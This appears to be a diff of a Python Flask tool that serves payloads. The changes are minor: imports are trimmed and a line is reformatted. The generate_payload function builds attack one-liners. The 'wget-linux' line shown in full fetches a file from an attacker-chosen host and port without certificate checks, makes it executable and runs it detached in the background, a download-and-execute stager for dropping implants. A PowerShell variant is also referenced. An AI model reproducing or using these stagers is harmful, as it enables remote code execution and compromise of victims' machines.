@@ -1,13 +1,11 @@
 import shutil
-from os import abort
-
 from flask import *
 import string
 import random
 import base64
 import sys
 from utils.colors import *
-from os import getcwd, chdir, path
+from os import getcwd
 
 cli = sys.modules['flask.cli']
 cli.show_server_banner = lambda *x: None
@@ -66,7 +64,8 @@ def generate_payload(lang, host, port, uri):
 
     elif lang == "wget-linux":
         random_str = randomize_str()
-        one_liner = "wget -qO {random_str} --no-check-certificate http://{host}:{port}/{uri}; chmod +x {random_str}; ./{random_str}& disown".format(random_str=random_str, host=srv_host, port=srv_port, uri=srv_uri)
+        one_liner = "wget -qO {random_str} --no-check-certificate http://{host}:{port}/{uri}; chmod +x {random_str}; ./{random_str}& disown".format(
+            random_str=random_str, host=srv_host, port=srv_port, uri=srv_uri)
 
     elif lang == "wget-psh":
         random_str = randomize_str()
@@ -74,7 +73,6 @@ def generate_payload(lang, host, port, uri):
             random_str=random_str, host=srv_host, port=srv_port, uri=srv_uri)
 
     return one_liner
-
 
 
 @app.route("/<path:path>")
